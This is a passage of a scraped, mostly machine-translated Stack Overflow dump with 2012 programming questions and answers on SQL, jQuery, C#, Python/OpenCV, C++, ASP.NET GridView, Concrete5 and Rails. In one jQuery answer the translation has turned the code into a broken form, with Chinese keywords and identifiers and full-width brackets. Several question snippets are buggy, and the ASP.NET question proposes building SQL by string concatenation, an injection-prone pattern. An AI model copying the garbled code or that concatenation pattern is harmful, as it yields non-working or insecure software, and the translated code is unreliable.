</table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:12:26.757

```
SELECT * 
FROM video 
JOIN wp_users ON wp_users.id = video.userID
JOIN images ON images.userID = wp_users.id
ORDER BY imagedate 
```

*[**在这里**](https://stackoverflow.com/questions/7079595/how-do-i-select-data-from-more-than-one-table-and-display-it-with-php?rq=1)检查承认的答案。*

# c# - Save/Restore(Get/Set) absolute position of UI control (textbox) dynamically with C# code in Win8 Metro Store app

> ID：13280902
> 
> 赞同：1
> 
> 时间：2012-11-08T00:59:30.530
> 
> 标签：c#, textbox, windows-8, microsoft-metro, dynamically-generated

as said in title, it's about Windows 8 Metro style store app.

-Textbox is dynamically generated by Code - Textbox can be dragged by user to anywhere to the screen - user can save the location of textbox anytime - user can restore the location of its previously saved location on screen. - List item

eg.

```
TextBox t = new TextBox();
t.Name = "TextBoxControl";
// add event for dragging
t.ManipulationDelta += t_ManipulationDelta;
t.RenderTransform = dragTranslation;
// Add textbox to screen
Basic_Root.Children.Add(t) 
```

User can drag and textbox anywhere in the screen, but i need to save the position of this dragged textbox's new location. And there is a button, once clicked, will restore the textbox to its previously saved location, may I know how this can be done?

I thought of saving the Margin value of textbox, and set it later for restoring its position, but it didn't work.

I found something about....

```
var ttv = MainTextBlock.TransformToVisual(Window.Current.Content);
Point screenCoords = ttv.TransformPoint(new Point(0, 0) 
```

This allow me to see the x,y location of the dragged textbox, so I save the Point, but how can I restore textbox's location with this saved Point?

Many Thanks!

# python - Python图像匹配。从 nxn 图像中查找 mxm 图像

> ID：13280904
> 
> 赞同：1
> 
> 时间：2012-11-08T00:59:36.800
> 
> 标签：python, image-processing, python-imaging-library

所以我的问题是一个相对简单的问题，但对于像我这样的 Python 菜鸟来说仍然相当困难。所以我基本上在输入图像中有许多形状，比如正方形左右的一堆小三角形。我需要从图像中提取外部正方形和每个三角形。我已经开发了一个简单的模板匹配代码来做到这一点......但它似乎不起作用！

```
while ( len(numpy.where( b <150 )[0])!=xx):
xx=len(numpy.where( b <150 )[0])
for v in range(len(b)-len(a)):
    for w in range(len(b[0])-len(a[0])):
        c=b[v:v+len(a[0]),w:w+len(a)]
        c.flags.writeable=False
        #c=b.reshape(len(a),len(a))
        vv=sum(sum(c-a))
        #print v, w
        if(vv<minval):
            minval=vv
            xcor=v
            ycor=w

print xcor, ycor, minval
print len(numpy.where( b <150 )[0])
print b[xcor:xcor+len(a),ycor:ycor+len(a[0])]
for p in range(xcor,xcor+len(a)):
    for q in range(ycor,ycor+len(a[0])):
        b.setflags(write=True)
        b[p][q]=251;
#print b[xcor:xcor+len(a),ycor:ycor+len(a[0])]
xcorr=0
ycorr=0
minval=99999 
```

问题是我只需要提取一组简单的数字，但我的代码一直在继续……另外，我不知道如何处理 TRIANGLES IN A BOX 问题。有人可以帮我吗？

通过提取，我的意思是只找出对象被放置的位置......如果它被放置！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T05:38:45.573

如果您决定使用 opencv，这应该可以帮助您入门：

```
import cv2

def show_image_and_wait_for_key( image, name="Image" ):
    print "showing",name,"(waiting for input)"
    cv2.imshow('norm',image)
    cv2.waitKey(0)

def draw_segments( image , segments, color=(255,0,0), line_width=1):
        '''draws segments on image'''
        for segment in segments:
            x,y,w,h= segment
            cv2.rectangle(image,(x,y),(x+w,y+h),color,line_width)

original= cv2.imread("ravens.jpg")
image=original
image= cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
image= cv2.GaussianBlur(image,(3,3),0)
_, image= cv2.threshold( image, 140, 255, cv2.THRESH_BINARY )
contours,hierarchy = cv2.findContours(image.copy(),cv2.RETR_LIST,cv2.CHAIN_APPROX_SIMPLE)
segments= [cv2.boundingRect(c) for c in contours] 
draw_segments( original, segments )
show_image_and_wait_for_key( original ) 
```

在此之后，您可以按矩形区域、位置、纵横比等进行过滤。您可以使用此功能从图像中提取区域：

```
def region_from_segment( image, segment ):
    '''given a segment (rectangle) and an image, returns it's corresponding subimage'''
    x,y,w,h= segment
    return image[y:y+h,x:x+w] 
```

所有图像也是 numpy `ndarray`，因此您应该对 cv2 界面感到满意

# jquery - How do I delete options and maintain a copy of the original?

> ID：13280905
> 
> 赞同：2
> 
> 时间：2012-11-08T00:59:41.057
> 
> 标签：jquery, dom, drop-down-menu, options

I have two drop downs, one which influences the other. The first acts as a filter for the second. Hiding `(display:none)` options does not work for IE8\. So I need to actually remove the options. But I want to be able to reset the options to the original list and filter them again for a different team. The problem is either I delete options and never get them back OR I never delete anything. My gut tells me it is related to references or assigning the new object back to the DOM.

1st dropdown (dd1) - the html for this is right in my code, I had difficulty displaying it.

```
<select id="pTeamFilter" onchange="teamChanged();" name="pTeamFilter">
    <option value="0">select a Team</option> 
    <option value="4"> Property Team </option> 
    <option value="7"> Rick's Team </option> 
    <option value="10"> Robert's Team </option>
</select> 
```

2nd dropdown (dd2)

```
<select id="pAnalystFilter" name="pAnalystFilter">
    <option value="0">select an Analyst</option>
    <option data-teamid="7" value="682"> Clark Kent </option>
    <option data-teamid="10" value="652"> Bruce Wayne </option>
    <option data-teamid="10" value="7"> Peter Parker </option>
    <option data-teamid="13" value="971"> Bruce Banner </option>
</select> 
```

**JS/jQ:**

```
var analystFullArrayElement;
jQuery(document).ready(function() {
    analystFullArrayElement = jQuery(document.getElementById('pAnalystFilter')).clone();
});

function teamChanged() {
    //get the team id
    var teamId = document.getElementById('pTeamFilter').value;
    //get full list of Analysts.
    var newAnalystElement = jQuery(analystFullArrayElement).clone();
    jQuery('option', newAnalystElement).each(function() {
        //remove unwanted analysts
        if ((jQuery(this).attr("data-teamid") != teamId) && (jQuery(this).val() != 0)) {
            jQuery(this).remove();
        }
    });
    document.getElementById('pAnalystFilter').innerHTML() = jQuery(newAnalystElement).html();
    //var analystElement = document.getElementById('pAnalystFilter');
    //jQuery(analystElement).val(0);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T22:14:03.940

此外，您还可以：

1.  使用 jquery 事件绑定而不是“onchange”属性。
2.  使用 $() 而不是 jQuery。如果你使用 noConflict，你可以这样做

    (function ($) { 你的代码在这里用 $ 代替 jQuery })(jQuery);

3.  使用`$(function () {})`代替`$(document).ready(function () {})`

4.  使用链接。我是说

    jQuery('#pAnalystFilter').empty().append(jQuery(newAnalystElement).html());

5.  使用 data() 方法获取 attr('data-smth')

6.  如果你多次使用 $(this) ，最好将它存储在一个变量中

```
（函数（$）{
    $（函数（）{

        var 分析师FullArrayElement; // 顺便说一下，你的全局范围很干净而且很好

        $（函数（）{
            分析师FullArrayElement = $('#pAnalystFilter').clone();
        });

        $("#pTeamFilter").change(function () {
            //获取团队ID
            var teamId = $('#pTeamFilter').val();
            //获取分析师的完整列表。
            var newAnalystElement = $(analystFullArrayElement).clone();
            $('option', newAnalystElement).each(function(){
                //删除不需要的分析师
                var $this = $(this);
                if(($this.data("teamid") != teamId) && ($this.val() != 0)){
                    $this.remove();
                }
            });                
            $('#pAnalystFilter').empty().append($(newAnalystElement).html());
        });

    });
})(jQuery);
```

也可以`($this.val() != 0)`通过在选择器中添加 :gt(0) 而不是应用过滤器来避免比较，所以

```
$('option', newAnalystElement).each(function(){
    var $this = $(this);
    if(($this.data("teamid") != teamId) && ($this.val() != 0)){
        $this.remove();
    }
}); 
```

变成

```
$('option:gt(0)', newAnalystElement).filter(function () {
    return $(this).data("teamid") != teamId;
}).remove(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T17:46:29.553

两个变化。1\. 我将 document.getElements 更改为 jQuery 调用。

```
 analystFullArrayElement = jQuery('#pAnalystFilter').clone(); 
```

1.  我使用 .empty() 后跟 .append() 来摆脱旧列表并应用新列表。

    ```
     function teamChanged(){
            //get the team id
            var teamId = jQuery('#pTeamFilter').val();
            //get full list of Analysts.
            var newAnalystElement = jQuery(analystFullArrayElement).clone();
            alert(jQuery(newAnalystElement).html());
            jQuery('option', newAnalystElement).each(function(){
                //remove unwanted analysts
                if((jQuery(this).attr("data-teamid") != teamId) && (jQuery(this).val() != 0)){
                    jQuery(this).remove();
                }
            });
            alert(jQuery(newAnalystElement).html());                
            jQuery('#pAnalystFilter').empty();
            jQuery('#pAnalystFilter').append(jQuery(newAnalystElement).html());
        } 
    ```

# php - jquery 计算适用于 jsfiddle 示例，但不适用于主代码

> ID：13280908
> 
> 赞同：0
> 
> 时间：2012-11-08T01:00:08.930
> 
> 标签：php, javascript, jquery

我在[这里](http://jsfiddle.net/JWTQk/2/)有一个 jsfiddle，其中使用了一个 jquery 函数，能够在文本输入中输入的数字与每个问题的“总分”数字减去数字之间进行计算。

在 jsfiddle 中玩一玩，在问题 1 中更改文本输入中的值，您将看到总分在同一个问题块中发生变化。对于问题 2，它是一个只读框，但它是只读的原因是因为它是一个单一的答案。如果一个问题只有一个答案，那么文本输入应该是只读的，否则如果有多个答案，那么它不应该是只读的。

事实是，我希望 jquery 函数可以使用下面的代码，但目前还不行。这些是我需要解决的问题：

*   总分不应等于 5，应等于 的值`$searchMarks[$key]`，因为每个问题的总分可能不同
*   目前对于下面的代码，它不执行计算
*   最后，如果问题仅包含单个答案，则不会将文本输入设为只读。

我的问题是应该如何设置下面的代码，以便它可以与 jsfiddle 完全相同？

下面是代码：

```
<script type="text/javascript" src="jquery/jquery-1.7.min.js"></script>
<script type="text/javascript" src="jquery/jquery-ui-1.8.16.custom.min.js"></script>
<script type="text/javascript" src="jquery/basic.js"></script>

<script type="text/javascript">

        $(document).ready(function() {

    var $inputs = $('input.individualMarks');

$inputs.filter(function() {
    return $(this).prop('readonly') === true;
}).each(function() {
    var $input = $(this);

});

$inputs.filter('[data-q_group]').keyup(function() {
    var $group = $inputs.filter('[data-q_group="' + $(this).data('q_group') + '"]');
    var $marks = $group.eq(0).closest('tr').find('td.noofmarkstd');
    var markVal = <?php $searchMarks ?>;
    $group.each(function() {
        markVal -= ($(this).val() || 0)
    })
    $marks.text(markVal)

})

});

    </script>   

    </head>

    <body>

    <form id="QandA" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post">

    <?php 

    echo "<table border='1' id='markstbl'>
          <tr>
          <th class='questionth'>Question No.</th>
          <th class='questionth'>Question</th>
          <th class='answerth'>Answer</th>
          <th class='answermarksth'>Marks per Answer</th>
          <th class='noofmarksth'>Total Marks</th>
          </tr>\n";
    $previous_question_id = null;
    $rowspans = array_count_values($searchQuestionId);
    foreach ($searchQuestionContent as $key=>$question) {

        // removed logic, not necessary to set empty strings if you're skipping them

        echo '<tr class="questiontd">'.PHP_EOL;

        if ($previous_question_id != $searchQuestionId[$key]) {
            echo '<td class="questionnumtd" name="numQuestion" rowspan="'.$rowspans[$searchQuestionId[$key]].'">'.htmlspecialchars($searchQuestionId[$key]).'</td>' . PHP_EOL;
            echo '<td class="questioncontenttd" rowspan="'.$rowspans[$searchQuestionId[$key]].'">'.htmlspecialchars($question).'</td>' . PHP_EOL;
        }

        echo '<td class="answertd" name="answers[]">';
        echo $searchAnswer[$key];
        echo '</td>' ;
        echo '<td class="answermarkstd"><input class="individualMarks" name="answerMarks[]" id="individualtext" type="text" /></td>' . PHP_EOL;

        if ($previous_question_id != $searchQuestionId[$key]) {
            echo '<td class="noofmarkstd" rowspan="'.$rowspans[$searchQuestionId[$key]].'">'.htmlspecialchars($searchMarks[$key]).'</td>' . PHP_EOL;
        }

        // moved this to the end
        if ($previous_question_id != $searchQuestionId[$key]) {
            $previous_question_id = $searchQuestionId[$key];
        }
    }
            echo '</tr>';
            echo "</table>" . PHP_EOL;

            ?>

    </form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T04:19:00.140

您的代码在将其包含在 $(document).ready 中后，在本地的行为与在 jsFiddle 中的行为相同（如上面的评论中所述）。

```
$(function() {<your code>}); 
```

也许你忘了 src jquery？

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script> 
```

# c# - 为 Winforms 设计缓存模式

> ID：13280912
> 
> 赞同：0
> 
> 时间：2012-11-08T01:00:37.110
> 
> 标签：c#, winforms, caching, singleton

我有一个 Winform 应用程序，我正在尝试实现缓存，以便在每次调用我的类方法之一时加快读取数据的过程。我正在考虑使用类似 Singleton 的方法。我在想这样的事情：

```
public class MyCache {
    private MyDataClass _cacheData;
    private static MyCache _cache;

    public static MyCache CreateCache()
    {
        return _cache ?? new MyCache();
    }

    public void CacheData(MyDataClass data)
    {
        _cache = data;
    }

    public MyDataClass GetCache()
    {
        return _cache;
    } 
} 
```

有人可以告诉我这种方法是否好，或者我应该使用更好的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T02:21:17.343

对于您的情况，我建议使用表单级缓存，即具有相应属性的共享/静态列表。列表是指任何类型的对象，但很可能是字典——有一`(key,value)`对。在每个属性中， if`Nothing`从数据库中填充，然后从 中读取`_variable`，因此它只会加载一次。像这样的东西：

```
Dictionary<string, string> _VendorData;
public object VendorData
{
  get
  {
    if (_VendorData == null)
      _VendorData = GetVendorDictionary();
    return _VendorData;
  }
}

public Dictionary<string, string> GetVendorDictionary()
{
  //get vendor data from database and populate a dictionary
} 
```

如果您计划在缓存中包含更多对象，您可能会考虑创建一个`Dictionary`of`<YourObjectTypesEnum, Dictionary<String, String>>`来代替， where `YourObjectTypesEnum`can be `Vendor`,`Manufacturing`等`Location`。因此您可以在代码中严格输入，而不是访问 by `String`。然后，您将进行测试`ContainsKey`而不是空检查，`.Add`如果丢失则使用字典。

如果您以后决定在其他表单上使用此缓存，您可以轻松地将其移动到单独的类中，因为所有方法和属性无论如何都是静态的。

# jquery - jquery，用动画限制日期选择器中的日期范围

> ID：13280913
> 
> 赞同：0
> 
> 时间：2012-11-08T01:00:43.870
> 
> 标签：jquery, datepicker, jquery-animate

这是 html 正文中的输入字段..

```
Date: <input type="text" id="datepicker" name="datepicker" readonly="readonly"/> 
```

当注释代码未注释时，以下代码将动画添加到日期选择器中，但是当尝试添加日期限制时，只有动画有效。
不过，自行添加日期限制可以正常工作。
这两个功能怎么会互相“干扰”？不确定我是否正确称呼他们。

```
$(function() {
    var today = new Date();         
    $('input[name=datepicker]').val((today.getMonth() + 1) + "/" + today.getDate() + "/" + today.getFullYear());

    //$("#datepicker").datepicker();
    var backupStarted = new Date(2012,10,07);
    $("#datepicker").datepicker("option", "showAnim", "drop");
    $("#datepicker").datepicker({minDate: backupStarted, maxDate: today});
}); 
```

感谢您对此的任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:05:04.047

你为什么不只使用一个电话？

```
$("#datepicker").datepicker({
    minDate: backupStarted, 
    maxDate: today,
    showAnim: 'drop'
}); 
```

我不知道这是否能解决问题，但它可以。

# python - Python：Import * 只从包中导入某些东西？

> ID：13280916
> 
> 赞同：3
> 
> 时间：2012-11-08T01:01:04.800
> 
> 标签：python, import, wildcard

我有一个名为 elements 的包，其中包含一些东西，如按钮、三推子、海报。在 Button 类中，我正在做`from elements import *`

这可以正常执行，当我尝试时`print(poster)`，也可以正常工作并按预期运行。但是，当我这样做时`print(trifader)`，`NameError: name 'trifader' is not defined`. 即使trifader和poster在同一个包中，poster是定义的，但是trifader不是吗？多么奇怪。对此有什么解释吗？

元素包的目录结构是这样的：

```
Elements:
  __init__.py
  trifader.py
  button.py
  poster.py 
```

此外，还有一些其他不相关的东西。

每个 .py 文件都包含一个名为 .py 的类，例如 trifader.py 有一个名为 TriFader 的类。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:11:59.300

如果您`__init__.py`没有`__all__`定义（从而限制使用导入的内容`from X import *`），那么您可能在`import`某处有一个循环，导致模块在其定义被评估之前被引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:13:07.673

检查循环导入。循环导入很好，两个模块都使用“import”形式的导入。当第二个模块想要从第一个模块中获取一个名称（“从模块导入名称”）并且导入位于顶层时，它们会失败。那是因为第一个模块中的名称尚不可用，因为第一个模块正忙于导入第二个模块。其次，如果在调用导入时函数内部调用了导入，则第一个模块将完成初始化，第二个模块可以进行导入。

# c# - 在方法内分配变量值

> ID：13280919
> 
> 赞同：1
> 
> 时间：2012-11-08T01:02:01.520
> 
> 标签：c#

我正在尝试获取可以将值分配给多个变量的 make 方法。我不知道我会有多少变量，但我知道它们的类型。不过，这些变量都可以是不同的类型。

我已经对此进行了相当多的搜索，并且相当确定这不能使用托管代码来完成。（如果我错了，请纠正我）

我对不安全代码知之甚少（阅读：任何东西）。可以那样做吗？也许传递一个指向我想要初始化的变量的指针数组并这样做？

我基本上是在寻找一种将任意数量的混合类型变量传递给方法并在方法内分配它们的值的方法......它是天上掉馅饼吗？

编辑1：

这是一些我希望能说明我想要实现的代码：

```
private void SomeMethod()
{
    string a = string.empty;
    int b = 0;
    double c = 0;

    object[] testObject = new object[] { b, c };

    SetVariables(ref testObject);
}

public static void SetVariables(ref object[] Variables)
{
    for (int i = 0; i < Variables.Length; i++)
        Variables[i] = // The value the variable needs to have
} 
```

执行后`SetVariables`，a、b 和 c 会说：

```
a = "Some text"
b = 123
c = 1564.653 
```

我正在寻找一种方法来访问作为参数传递给 SetVariables 的变量并修改它们的值。我想这意味着访问它们在内存中的存储位置，因此我认为我可能需要指针？

编辑2：

[我在这里的问题](https://stackoverflow.com/questions/13266305/casting-data-to-type-of-variables-stored-in-object)应该更好地说明我试图这样做的背景。

我将只处理基本类型：字符串、int、double 和 bool，用于我要分配的变量。

我分配的数据是文本格式，并且具有可变数量的字段。每个字段都应该按照传入变量的顺序映射到其中一个输入变量。如果顺序不匹配，最好的情况是分配错误，或者最坏的情况是类型错误，但由用户决定确保变量与数据匹配。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:43:50.333

您尝试做的事情在 C# 中效果不佳。这实际上是一个语言问题，而不是“托管与非托管”的事情。

它通常不会出现那么多，因为在您的示例代码中，您确实知道您有 2 个变量。您必须键入它们才能将它们输入到数组中。

如果`SetVariables()`要从代码中的很多地方使用不同数量的参数调用，您可以对方法进行一堆重载（使用 1 个参数、2 个参数、3 个参数等）。

但说实话，通常当你遇到这种情况时，这是因为你以不明智的方式做某事。

多想一想，这条线会怎样：

```
Variables[i] = // The value the variable needs to have 
```

预计将在这种情况下工作。它怎么知道将任意变量设置为什么，因为它可以是任何类型？`b, c`另外，如果我将调用从传入变量更改为反转它们，是什么阻止它弄乱变量分配`c, b`？

从逻辑上讲，它开始分崩离析。

我想我想说的是 C# 不能很好地支持它，但它通常不需要，因为它很少有意义。

* * *

无论如何都试图想出一个可行的解决方案；我只会`SetVariables`返回值，但不接受参数。分配其变量应该是其他函数的工作。如果您需要知道类型，则只需传递类型：

```
public object[] GetValues(params Type types)
{
    var result = new object[types.length];
    for (int i = 0; i < types.length; i++)
    {
        if(types[i] == typeof(string))
            result[i] = "foo";
        if(types[i] == typeof(int))
            result[i] = -1;
    }
    return result;
}

public void DoStuff()
{
    var data = GetValues(typeof(string), typeof(int), typeof(string));
    string foo1 = (string)data[0];
    int someNumber = (int)data[1];
    string foo2 = (string)data[2];
} 
```

它丑陋，但它的工作...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T02:06:34.953

这是一个改编自[this answer to a similar question](https://stackoverflow.com/a/1776347/12707)的示例，不幸的是，您的问题有点难以解决，而且确实没有一种简单的方法可以完成您想要的。

```
private static void SomeMethod() {
    string a = string.Empty;
    int b = 0;
    double c = 0;

    SetVariables(x => a = (string)x
               , x => b = (int)x
               , x => c = (double)x);

    Console.WriteLine("a: {0}\nb: {1}\nc: {2}", a, b, c);
}

public static void SetVariables(params Action<object>[] setters) {
    var tokens = new object[] { "Hello", 10, 14.235 };
    for (int i = 0; i < setters.Length; i++)
        setters[i](tokens[i]); // Assumed this is read and initialized properly
} 
```

我承认这有点味道，但由于您确实必须考虑变量输入，它应该让您更接近您想要的，而不会增加过多的复杂性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T01:40:00.943

我认为您自己非常接近答案。假设分配给变量的值仅基于它的类型，然后假设您使用上面发布的代码，您可以在 for 循环期间将值类型与 typeof() 检查进行比较：

```
if(Variables[i].GetType() == typeof(int)){
    //...do stuff
}

//etc...until you have an if for each data type you expect you might find 
```

这是 typeof[文档的链接](http://msdn.microsoft.com/en-us/library/58918ffs.aspx)

我假设您已经了解了如何使用引用类型，但以防万一请看[这里](http://msdn.microsoft.com/en-us/library/0f66670z%28v=vs.71%29.aspx)

# c++ - 卡在 C++ 函数和数组上

> ID：13280921
> 
> 赞同：0
> 
> 时间：2012-11-08T01:02:02.047
> 
> 标签：c++, visual-c++

```
#include <iostream>
using namespace std;

const int monkeys = 3;
const int weekdays = 7;
double monkeyWeek[monkeys][weekdays];
double largest;
double least;
double average;
int index;
int dayCount;
double amount;

double amountEaten(double[] [weekdays], int);
double mostEaten (double[] [weekdays],int);
double leastEaten (double[][weekdays], int);

int main(){
cout << "Ch 7-4 Monkey " << endl;
cout << "Created by Aaron Roberts" << endl;

double mostBananas (double[] [weekdays],int);
double leastBananas (double[][weekdays],int);
//double bananaAverage (double[][weekdays], int);

}

double amountEaten(double array[] [weekdays], int){
    cout << "Please enter the amount of food eaten per monkey per day." << endl;
double amount = array[0][0];
for (index = 0; index < monkeys; index++)
{
    for (dayCount = 0; dayCount < weekdays; dayCount++)
    {
    cout << endl <<"Please enter the amount of pounds eaten by     monkey"     
        <<(index +1)
            << endl << "for day " << (dayCount +1) << ": ";
        cin >> monkeyWeek[monkeys] [weekdays] ;
        if (monkeyWeek[monkeys] [weekdays] < 1)
            cout << endl <<"Must feed positive amount" << endl;
    }

}
}

double mostEaten( double array[] [weekdays], int size)
{
double largest = array[0][0];
for (int count = 0; count < size; count++)
{
    for (int col = 0; col < count; col++)
    {
        if (array[count][weekdays] > largest)
            largest = array[count][weekdays];
    }
}
return largest;
}

double leastEaten(double array[] [weekdays], int size)
{
double least = array[0][0];

for (int count = 0; count < size; count++)
{
for (int col = 0; col < size; col++);
{
if (array[count][weekdays] < least)
least = array[count][weekdays];
}
}
return least;
} 
```

该项目需要使用二维数组来存储 3 只猴子每周 7 天吃掉的食物磅数。

创建一个函数来获取一周中每一天每只猴子吃掉的磅数。创建第二个函数来确定通过数组来计算所有吃的钱的总数，然后是一天吃的平均值。（你们中的一些人将此解释为对所有值求和，然后除以值的数量。其他人将此解释为对每天的值求和并计算当天的平均值。因此，将有 7 行输出，而不仅仅是一条。 )

创建第三个函数来确定哪只猴子在哪一天吃的食物最少。还要输出猴子那天吃的量。创建第四个函数来确定哪只猴子一天吃的食物量最多。输出猴子数量、吃的磅数和工作日。

我是 C++ 的新手并且卡住了，真的不知道如何完成这个。感谢您的帮助，我真的很感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:13:01.653

你一直在做这样的事情：

```
for (int count = 0; count < size; count++)
{
    for (int col = 0; col < count; col++)
    {
        if (array[count][weekdays] > largest)
            largest = array[count][weekdays];
    }
} 
```

看到您正在使用`weekdays`索引您的数组。但是那个索引是无效的。它可能有点工作，但总是会返回下一行的第一个元素（然后在最后一行有更明确的未定义行为）。

我很确定你打算使用`col`而不是`weekdays`这里。

正如 WhozCraig 在评论中指出的那样，您可能也需要遍历整个`weekdays`范围。这是一个稍微修复的循环：

```
for (int count = 0; count < size; count++)
{
    for (int col = 0; col < weekdays; col++)
    {
        if (array[count][col] > largest)
            largest = array[count][col];
    }
} 
```

同样，对于您所做的其他任何地方...

# asp.net - ASP.NET GridView - 具有会话变量条件的 SelectCommand

> ID：13280923
> 
> 赞同：0
> 
> 时间：2012-11-08T01:02:30.173
> 
> 标签：asp.net, gridview, ado.net

我是 ASP.NET 的新手

我正在尝试将查询与会话变量中的条件结合起来。

基本上，我捕获某些输入并在下面构建一个 Session 会话。我知道它通过 Response.Write 起作用。

```
Session("QueryCondition") = " AND Name like '%Test%' AND CompLeteFlag = 1" 
```

我的 GridView1 中有一个 SelectCommand

```
SelectCommand="SELECT top 100 * FROM [EnhanceTracking] WHERE 1 = 1 order by ID DESC" 
```

我想做的是上面的查询与 Session("QueryCondition") 结合来过滤记录。如果是经典的 ASP，那么可以这样

```
SelectCommand="SELECT top 100 * FROM [EnhanceTracking] WHERE 1 = 1 " & Session("QueryCondition") & " order by ID DESC" 
```

但是，我不知道如何在 ASP.NET 中执行此操作，因为它不允许将变量与 SelectCommand 组合。

请告知该怎么做。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T08:06:46.237

我为自己制作的 Web 应用程序做了类似的事情。您可以利用 asp:SqlDatasource 的 OnSelecting 事件（我建议使用它而不是在代码隐藏中动态构建选择命令）来动态调整选择命令的参数。

我不确定这是否是这样做的最佳方式，但它确实有效。

我的标记看起来像这样（简化的 GridView 标记）：

```
<asp:SqlDataSource ID="SelectItemsDataSource" runat="server" 
    ConnectionString="<%$ ConnectionStrings:hubConnectionString %>" 
    ProviderName="<%$ ConnectionStrings:hubConnectionString.ProviderName %>" 

        SelectCommand="SELECT itemEntity.id, itemEntity.name, itemEntity.filename, itemEntity.type, itemEntity.added, userEntity.name FROM item AS itemEntity 
                        LEFT OUTER JOIN USER AS userEntity ON itemEntity.uploader = userEntity.id WHERE itemEntity.type like @type ORDER BY itemEntity.added DESC" 
        OnSelecting="onItemSelecting"> 
        <SelectParameters>
           <asp:Parameter Name="@type" Type="String" />
        </SelectParameters>       
</asp:SqlDataSource>

<asp:GridView ID="ItemGrid" runat="server" DataSourceID="SelectItemsDataSource"/> // Simplified 
```

注意 OnSelecting 属性。

然后在代码隐藏中，您可以简单地处理 OnSelecting 事件：

```
protected void onItemSelecting(object sender, SqlDataSourceSelectingEventArgs e)
{
    // Type value NOT given and parameter exists - Set wildcard
    if (Request.QueryString["type"] == null && e.Command.Parameters.Contains("@type"))
    {
        e.Command.Parameters["@type"].Value = "%";
        return;
    }
    if (Request.QueryString["type"] != null && e.Command.Parameters.Contains("@type"))
            e.Command.Parameters["@type"].Value = Request.QueryString["type"];   
    } 
```

我相信 Command.Parameters 方法是 sql 注入安全的。如果不是那么有人请纠正我。

# content-management-system - Concrete5的Composer界面如何为不同的用户组设置不同的默认属性值？

> ID：13280926
> 
> 赞同：1
> 
> 时间：2012-11-08T01:03:10.073
> 
> 标签：content-management-system, concrete5

*大家好，我认为这可能是也可能不是编程问题。但是我试图在concrete5论坛上问这个问题，但没有运气。希望有人可以在这里给我一个线索..*

**有什么方法可以为每个用户组的 composer 中的属性设置不同的默认值？**

让我详细解释我的问题。我的客户有大约 60 个组织单位（每个单位都有自己的用户组）。对于每个单元，他们都希望拥有自己的页面列表。独家包含单位成员发布的所有文章。除此之外，来自组织单位的所有帖子也应该汇总在全球新闻类别的子类别中。所以我将内容结构构造成这样

组织单位目录 [页面类型]

*   第一单元的文章
*   第二单元的文章
*   第三单元的文章
*   ...

新闻[页面类型]

*   组织单位信息[包含所有单位的汇总页面列表]
*   ..其他新闻子类别..
*   ..其他新闻子类别..
*   ..其他新闻子类别..

对于上述内容结构，我将“NEWS”顶级类别和“ORGANIZATIONAL UNIT DIRECTORY”设置为page_type，并为新闻子类别创建一个属性（我将其命名为“news_location”）。并再创建一个属性来确定单位（我将其命名为“单位”）。

现在，我的问题是，如何在作曲家上为特定用户组预设属性“news_location”和“unit”。例如，对于“单元 1”的成员。我希望他们有一个独特的作曲家，其属性“news_location”预设为“组织单位信息”，属性“unit”预设为“unit 1”。而且他无法更改这些属性，以便我们可以确保他们只会在适当的位置/类别上发布新文章。

我一直在摆弄concrete5 CMS，但找不到任何方法来做到这一点。我应该挖掘代码并为此制作自己的模块吗？

就是这样......期待解决方案。如果我的问题太复杂，我很抱歉：p

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T16:55:43.903

绝对没有内置功能可以让您在 Composer 中为不同的用户组设置不同的默认属性值（事实上，我什至不认为可以为属性设置*任何*默认值——即使它是相同的默认值所有用户的价值）。

您可以覆盖核心`CollectionType`类——在该`getComposerContentItems`方法中您可以编写一些代码来检查当前页面类型，检查每个属性键，并根据当前用户组为某些属性设置默认值。

但真正困难的部分实际上是设置属性值。在 Concrete5 中没有优雅的方法可以做到这一点——属性值总是与属性分配给的对象（例如，页面、文件或用户）相关联。我过去曾尝试在属性上任意设置任何默认值，但没有简单的方法可以做到这一点。（对于像文本框和复选框这样的简单属性类型并不太难......但对于像 DateTime 和 Select 类型这样的更复杂的东西，它太复杂了，我什至没有费心去弄清楚）。

您可能想尝试的是创建自己的属性类型，然后在属性类型本身中确定如何根据用户组设置默认值（如果不存在值）。这是我拥有的一些基本代码，它们演示了您自己的属性类型所需的最低限度： [https ://github.com/jordanlev/c5_minimal_attribute_type](https://github.com/jordanlev/c5_minimal_attribute_type)

另请查看 C5 文档以获取更详细（但也更混乱且更难理解）的解释和示例代码： http: [//www.concrete5.org/documentation/developers/attributes/overview](http://www.concrete5.org/documentation/developers/attributes/overview)

祝你好运！

# ruby-on-rails - Ruby on Rails - 使用 AJAX 不断循环新/创建操作

> ID：13280927
> 
> 赞同：0
> 
> 时间：2012-11-08T01:03:35.633
> 
> 标签：ruby-on-rails, ajax, ruby-on-rails-3, jquery

我有一个 Rails 控制器设置，当用户创建新记录时，它将再次重定向到新操作并用新数据填充表单，这可以继续循环，创建新记录并重定向到新动作。我遇到的麻烦是将 AJAX 添加到此，以便用户可以留在此循环中而无需重新加载页面。这是我没有 AJAX 的代码：

```
class ResponsesController
 def new
   @response = Response.new
   @answer_a = Answer.find(rand(1..100))
   @answer_b = Answer.find(rand(1..100))
   @answer_c = Answer.find(rand(1..100))
 end

 def create
   @response = current_user.responses.build(params[:response])
   if @response.save
      respond_to do |format|
